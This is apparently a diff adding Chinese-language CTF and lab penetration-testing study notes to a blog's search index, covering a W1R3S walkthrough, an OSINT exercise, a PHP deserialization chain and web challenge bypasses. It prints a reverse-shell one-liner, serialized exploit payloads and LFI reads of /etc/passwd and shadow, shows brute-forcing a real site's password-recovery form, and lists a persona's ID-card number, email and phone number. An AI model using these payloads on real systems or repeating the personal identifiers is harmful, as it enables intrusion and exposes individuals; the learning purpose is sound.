@@ -1,6 +1,283 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>渗透-W1R3S</title>
+    <url>/2023/02/16/%E6%B8%97%E9%80%8F-W1R3S/</url>
+    <content><![CDATA[<p>由于靶机和攻击机我都设置的是nat，处在同一个网关下，所以直接用nmap找一下靶机的ip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849611.png" alt="image-20230104152533315"></p>
+<p>猜测是130，再用nmap全扫一下，看看具体的版本信息、开放端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849989.png" alt="image-20230104155143068"></p>
+<p>显然，开了四个端口:21,22,80,3306</p>
+<p>其中，ftp的21端口可以匿名登陆，里边的文件可能有用；ssh的22端口可以爆破一下用户密码；80端口给的网页，可能有漏洞或者中间件可以攻击；3306数据库可能泄露</p>
+<p>先试一下ftp</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 192.168.11.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849045.png" alt="image-20230104160041435"></p>
+<p>把所有文件扒到本地试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849690.png" alt="image-20230104160005641"></p>
+<p>好像只有02.txt有点东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849893.png" alt="image-20230104160207387"></p>
+<p>但base64解出来啥都不是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849837.png" alt="image-20230104160236230"></p>
+<p>既然ftp走不了，ssh也没啥思路，那就试试web</p>
+<p>看到apache2.4.18，想到新生赛的中间件攻击，但是好像没有这个版本的漏洞，只能放弃中间件</p>
+<p>dirb扫一下</p>
+<p>扫到一堆&#x2F;administrator&#x2F;和&#x2F;wordpress&#x2F;的网址，访问看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849754.png" alt="image-20230104161157828"></p>
+<p>是一个cuppa cms框架的安装界面</p>
+<p>再找找cuppa cms有没有什么漏洞可以打</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849443.png" alt="image-20230104161347544"></p>
+<p>只找到一个，复制出来看看具体怎么实现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 25971.txt</span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>
+
+<p>看得到这个漏洞的打法，写的是可以通过这个漏洞读取非php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849433.png" alt="image-20230104161538221"></p>
+<p>参考题目的提示，那就很明显了， 试着读取登陆用户，爆破密码，然后之前找到的ssh就有用了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849441.png" alt="image-20230104164506537"></p>
+<p>把target&#x2F;cuppa改成刚刚找到ip&#x2F;administrator&#x2F;的输一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849444.png" alt="image-20230104162153636"></p>
+<p>没回显</p>
+<p>换用burpsuite发个post试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849447.png" alt="image-20230104164127035"></p>
+<p>拿到passwd信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849451.png" alt="image-20230104164144631"></p>
+<p>看到有一个特别的用户：w1r3s</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849343.png" alt="image-20230104164639537"></p>
+<p>再读一下shadow</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849493.png" alt="image-20230104165656963"></p>
+<p>存到pass.txt里，参考<a href="https://blog.csdn.net/weixin_46447549/article/details/121301645">Linux密码破解（使用hydra工具和使用john暴力破解）_国际知名观众的博客-CSDN博客_linux hydra</a></p>
+<p>用john爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849950.png" alt="image-20230104170005275"></p>
+<p>拿到密码和用户名，再ssh登陆</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181850745.png" alt="image-20230104170238620"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su </span><br></pre></td></tr></table></figure>
+
+<p>成功拿到root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181849287.png" alt="image-20230104170710939"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>考核-社工</title>
+    <url>/2023/02/16/%E8%80%83%E6%A0%B8-%E7%A4%BE%E5%B7%A5/</url>
+    <content><![CDATA[<p>qq用base64解码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845662.png" alt="image-20230115021820488"></p>
+<p>&#x3D;&#x3D;》<strong>3585956882</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845666.png" alt="image-20230115021918465"></p>
+<p>恰个qq，没啥东西，看到是12月12日属羊的，合理猜测一下<strong>出生年月2003.12.12</strong></p>
+<p>百度搜一下名字发现这个主页</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845680.png" alt="image-20230115022151325"></p>
+<p>在base64解码一下是个ip地址:82.157.233.217</p>
+<p>进去主页找到个帖子</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845799.png" alt="image-20230115022855052"></p>
+<p>可知<strong>真实姓名拼音缩写为ctz</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845709.png" alt="image-20230115023848828"></p>
+<p>图片的exif信息如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845706.png" alt="image-20230115025609631"></p>
+<p>查了一下这个地点在海上，屁用没有</p>
+<p>有几个信息点：塔像是西安大雁塔；家、塔、饭店一条直线；家离饭店近。</p>
+<p>可知，拍摄角度位于大雁塔侧方，所以可以排除几个餐饮点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845216.png" alt="image-20230115024435523"></p>
+<p>西北和东南的小区和饭店隔得太远了，不像是一首真没睡就到得了，大悦城那个方向没有什么住宅区，初步觉得是在8号位置的肯德基，<strong>家住科荣花园小区</strong></p>
+<p>进去后台看，提示密码在robots.txt里，打开发现是个压缩包。</p>
+<p>博客的其他帖子里发了个密码字典生成器。把已知的信息填进去得到密码字典，再把这个字典用作爆破的，得到密码<strong>CTZ2003.</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845205.png" alt="image-20230115140355486"></p>
+<p>进入后台拿到邮箱</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845221.png" alt="image-20230115142251161"></p>
+<p><strong><a href="mailto:&#51;&#x35;&#x38;&#53;&#x39;&#53;&#54;&#56;&#56;&#x32;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#51;&#x35;&#x38;&#53;&#x39;&#53;&#54;&#56;&#56;&#x32;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a></strong></p>
+<p>有一个私密的文章，写的是四级成绩，打开对比一下ctz</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845220.png" alt="image-20230115143016638"></p>
+<p><strong>真实姓名陈铁柱</strong></p>
+<p><strong>身份证372522200312120019</strong></p>
+<p>手机号试试用QQ的找回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845084.png" alt="image-20230115144420294"></p>
+<p>同理，在csdn上边找回一下，发现给出的信息更多</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845622.png" alt="image-20230116014611515"></p>
+<p>这下只用猜中间四位了</p>
+<p>用burp爆破一下这中间的四位数，由于csdn没啥验证服务，所以爆起来特别容易</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845406.png" alt="image-20230116022527859"></p>
+<p>发到intruder里，构造一下payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181845240.png" alt="image-20230116022558387"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846464.png" alt="image-20230116022606937"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846054.png" alt="image-20230116022439881"></p>
+<p>运气比较好，中间四位不在0001-0999，而且1081离1000很近，csdn没ban我</p>
+<p><strong>拿下手机号:15310815980</strong></p>
+<p>彩蛋：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846981.png" alt="image-20230116015559155"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181846864.png" alt="image-20230116015629824"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>考核</tag>
+        <tag>社工</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>考核-渗透</title>
+    <url>/2023/02/16/%E8%80%83%E6%A0%B8-%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>先扫网</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.11.1/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831033.png" alt="image-20230124005329665"></p>
+<p>靶机是192.168.11.131</p>
+<p>扫一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.11.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181831748.png" alt="image-20230124005825745"></p>
+<p>只开了22和80两个熟悉的端口和5355</p>
+<p>访问80</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b1-&gt;<span class="title function_ invoke__">web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不许反序列化哦&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1 . <span class="string">&#x27;  --0xfa&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;r1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;r1-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome to this game, hope you have a great day&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;c1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>dirsearch爆了一下只有flag.php，那就只能反序列化了</p>
+<p>先看一下输入点，在index.php中用post方法传入cmd中</p>
+<p>而最后应该利用ctf类中的getFlag函数，echo出flag</p>
+<p>1.要调用getFlag，得从pwn类中的__call方法进入</p>
+<p>2.要进入pwn中的__call方法，就要通过web类中__invoke()下的$this-&gt;b1-&gt;web()，令$this-&gt;b1&#x3D;new pwn()，使得web()方法成为不可用的方法进入__call中</p>
+<p>3.要进入web类中__invoke()，就要把web当成一个函数调用，可以在ctf类中使用execute()函数</p>
+<p>4.进入ctf类的execute()函数，可以从misc下的__toString()方法进入</p>
+<p>5.要使用__toString()方法，需要从pwn类下__destruct()方法中的字符串拼接实现</p>
+<p>所以反序列化链：</p>
+<p>unserialize反序列化-&gt;pwn下的__destruct()方法-&gt;misc下的__toString()方法-&gt;ctf下的execute()函数-&gt;绕过web下的__wakeup()方法-&gt;web下的__invoke()方法-&gt;pwn下的__call()方法-&gt;ctf下的getFlag()函数</p>
+<p>构造:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new pwn();</span><br><span class="line">$a-&gt;r1=new misc();</span><br><span class="line">$a-&gt;r1-&gt;w=new ctf();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1=new web();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1=new pwn();</span><br><span class="line">$a-&gt;r1-&gt;w-&gt;c1-&gt;b1-&gt;r1=new ctf();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>得到序列后的值：O:3:”pwn”:1:{s:2:”r1”;O:4:”misc”:1:{s:1:”w”;O:3:”ctf”:1:{s:2:”c1”;O:3:”web”:1:{s:2:”b1”;O:3:”pwn”:1:{s:2:”r1”;O:3:”ctf”:1:{s:2:”c1”;N;}}}}}}</p>
+<p>web后的1改为2绕过__wakeup()，得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832929.png" alt="image-20230125003958905"></p>
+<p>访问：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832523.png" alt="image-20230125004033786"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.11.131/Redr/oCk/Login.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>中间件是apache2.4.18，没找到漏洞利用</p>
+<p>dirsearch扫了一下目录，试了一下利用不太到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832088.png" alt="image-20230125023004286"></p>
+<p>在登陆框打’试试能不能sql注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832748.png" alt="image-20230125140418486"></p>
+<p>能注入，但没有回显，不方便手注</p>
+<p>直接上sqlmap</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832574.png" alt="image-20230125152718588"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832584.png" alt="image-20230125152729262"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832096.png" alt="image-20230125152740313"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832353.png" alt="image-20230125152747414"></p>
+<p>有user表，直接看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832242.png" alt="image-20230125152801893"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832546.png" alt="image-20230125152812017"></p>
+<p>拿到账号密码</p>
+<p>还有图片上传功能</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832474.png" alt="image-20230125152912999"></p>
+<p>尝试之后发现好像没有对后缀进行检测，而是对MIME类型有过滤，但是我按要求传PNG文件仍然报错</p>
+<p>（问过学长说不影响做题，那就dirb扫一下有什么目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181832181.png" alt="image-20230125200554740"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833024.png" alt="image-20230125200604749"></p>
+<p>蚁剑连一下，看看终端权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833831.png" alt="image-20230125200635200"></p>
+<p>没权限，看看hint</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833348.png" alt="image-20230125220516581"></p>
+<p>反弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机:</span><br><span class="line">mknod a p; telnet 192.168.11.128 2222 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line">攻击机:</span><br><span class="line">netcat -lvvp 2222</span><br></pre></td></tr></table></figure>
+
+<p>或者更自动化一点，用msf</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833636.png" alt="image-20230127144100412"></p>
+<p>切换到后台然后找一下漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833328.png" alt="image-20230127145533096"></p>
+<p>补全一下playload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833735.png" alt="image-20230127145629323"></p>
+<p>开日</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833308.png" alt="image-20230127145654832"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833957.png" alt="image-20230127145730742"></p>
+<p>拿到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834750.png" alt="image-20230127145855166"></p>
+<p>下边是手工提权然后失败的过程，还得是脚本小子好当</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833686.png" alt="image-20230126194943121"></p>
+<p>试试内核漏洞然后提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181833506.png" alt="image-20230125222934524"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834940.png" alt="image-20230125222947820"></p>
+<p>上面基本都试过了，要不就是编译的时候出问题，要不就是运行的时候就报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834051.png" alt="image-20230126213257249"></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/weixin_65527369/article/details/127973141">【日常记录】解决‘GLIBC_2.34‘ not found，并且gcc制定glibc版本编译_人间体佐菲的博客-CSDN博客</a></p>
+<p>在kali攻击机重新编译之后上传到靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -Wl,-rpath=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64&#x27;,-dynamic-linker=&#x27;/var/www/html/Redr/oCk/upload/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/ld-linux-x86-64.so.2&#x27; -s 40762.c -o 40762 -lkeyutils</span><br></pre></td></tr></table></figure>
+
+<p>执行没回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302181834082.png" alt="image-20230127133929635"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>考核</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web安全</title>
+    <url>/2023/02/16/web%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455944.png" alt="image-20221211231711676"></p>
+<p>底部看到有提示，构造get方法cat&#x3D;dog试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455523.png" alt="image-20221211231756648"></p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455163.png" alt="image-20221211233520721"></p>
+<p>源文件提示有个calc.php页面，用get方法传入num来计算，但是有WAF挡着</p>
+<p>分别传入数字和字母，发现传字母会被拦截</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456037.png" alt="image-20221211233707884"></p>
+<p>参考：[<a href="https://www.cnblogs.com/sfsec/p/15205011.html">RoarCTF 2019]Easy Calc - 随风kali - 博客园 (cnblogs.com)</a></p>
+<p>可知在num参数前加空格，可以让WAF检测不到num参数的同时传入num参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456539.png" alt="image-20221211233843529"></p>
+<p>那就用php的scandir()函数，列出目录。但黑名单是包含了”&#x2F;“的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456850.png" alt="image-20221211234126984"></p>
+<p>就用chr(47)替换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456540.png" alt="image-20221211234145597"></p>
+<p>效果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456060.png" alt="image-20221211234208952"></p>
+<p>同理，换用file_get_contents()函数显示f1agg内容，由于黑名单没有滤过f,1,a,g字符，所以直接传就可以了，不用换成ascii</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456522.png" alt="image-20221211234546925"></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p>看源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456535.png" alt="image-20221212000343880"></p>
+<p>要求用post传入password &#x3D;&#x3D; 404但又不能是数字，money &#x3D;&#x3D; 100000000</p>
+<p>参考：<a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">php中is_numeric函数的绕过_T0mrvvi1b3t的博客-CSDN博客_is_numeric绕过</a></p>
+<p>令password&#x3D;404a</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456925.png" alt="image-20221212001843684"></p>
+<p>将GET改POST的时候记得加:Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457037.png" alt="image-20221212001919297"></p>
+<p>提示太长了，换用科学计数法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457799.png" alt="image-20221212002214750"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457132.png" alt="image-20221212002218962"></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p>还没学会sql注入，暂时不做</p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>有点像新生杯的EZupload，但更简单</p>
+<p>注意到只能传jpg上去，那就用.htaccess绕过，然后上传一句话木马</p>
+<p>还没有内容检测，不用变形马</p>
+<p>在根目录有现成flag，而且权限足够，不需要在新生杯一样用diasble_function插件绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457008.png" alt="image-20221212011021115"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022红岩新生杯</title>
     <url>/2022/11/21/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/</url>
     <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单题，但是沃玛"><a href="#简单题，但是沃玛" class="headerlink" title="简单题，但是沃玛"></a>简单题，但是沃玛</h3><p>在js文件里看到redrockctf函数，flag应该就在这里边</p>
